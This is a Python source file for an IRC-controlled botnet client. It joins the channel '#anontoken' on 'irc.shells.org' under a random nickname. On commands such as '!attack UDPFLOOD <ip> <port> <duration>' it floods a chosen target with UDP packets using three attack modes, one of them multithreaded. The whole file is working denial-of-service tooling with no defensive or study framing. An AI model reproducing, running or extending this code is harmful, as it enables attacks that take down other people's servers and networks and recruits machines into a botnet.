import irc.bot
import irc.connection
import irc.strings
import socket
import time
import random
import string
import ssl
from threading import Thread, Timer
from time import sleep
import logging, hashlib

# Set the logging level to ERROR to suppress debug and info messages
logging.basicConfig(level=logging.ERROR, format="[%(asctime)s] [%(process)s] [%(levelname)s] %(message)s")
logg = logging.getLogger(__name__)

MAX_CHUNK_SIZE = 16 * 1024  # 16KB

class SimpleBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, server, port=6697, use_ssl=True):
        nickname = self.generate_random_nickname()
        factory = irc.connection.Factory(wrapper=ssl.SSLContext().wrap_socket) if use_ssl else irc.connection.Factory()
        super().__init__([(server, port)], nickname, nickname, connect_factory=factory)
        self.channel = channel

    def generate_random_nickname(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

    def on_welcome(self, connection, event):
        connection.join(self.channel)

    def on_pubmsg(self, connection, event):
        message = event.arguments[0]
        sender = event.source.nick
        
        if message.startswith("!attack HEX"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_hex(connection, ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack HEX <ip> <port> <duration>")
        
        elif message.startswith("!attack JUNK"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_junk(connection, ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack JUNK <ip> <port> <duration>")

        elif message.startswith("!attack UDPFLOOD"):
            params = message.split()
            if len(params) == 5:
                ip = params[2]
                port = int(params[3])
                duration = int(params[4])
                self.attack_udp_flood(connection, ip, port, duration)
            else:
                connection.privmsg(self.channel, "Usage: !attack UDPFLOOD <ip> <port> <duration>")

    def attack_hex(self, connection, ip, port, duration):
        end_time = time.time() + duration
        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

    def attack_junk(self, connection, ip, port, duration):
        end_time = time.time() + duration
        payload = b'\x00' * 64
        while time.time() < end_time:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.sendto(payload, (ip, port))
            s.close()

    def attack_udp_flood(self, connection, ip, port, duration):
        class UDPFlood(Thread):
            def __init__(self, host, port, timeout, total_sent):
                super().__init__()
                self.host = host
                self.port = port
                self.timeout = timeout
                self.total_sent_fn = total_sent
                self.total_sent = 0
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.sock.settimeout(self.timeout)

            def message(self):
                chunk = "A" * 1024 * 2
                self.total_sent_fn(len(chunk))
                self.total_sent += (len(chunk))
                return chunk

            def run(self):
                end_time = time.time() + self.timeout
                while time.time() < end_time:
                    self.sock.sendto(self.message().encode(), (self.host, self.port))
                self.sock.close()

        class UDPFloodManager(Thread):
            def __init__(self, host, port, timeout, max_threads):
                super().__init__()
                self.host = host
                self.port = port
                self.timeout = timeout
                self.max_threads = max_threads
                self.threads = []
                self.total_sent = 0

            def update_data(self, n):
                self.total_sent += n

            def run(self):
                for _ in range(self.max_threads):
                    thread = UDPFlood(self.host, self.port, self.timeout, self.update_data)
                    thread.start()
                    self.threads.append(thread)

                for thread in self.threads:
                    thread.join()

        manager = UDPFloodManager(ip, port, duration, 10)  # Assuming 10 threads for the flood
        manager.start()
        manager.join()

if __name__ == "__main__":
    CHANNEL = "#anontoken"
    SERVER = "irc.shells.org"
    PORT = 9999
    
    bot = SimpleBot(CHANNEL, SERVER, PORT, use_ssl=True)
    bot.start()
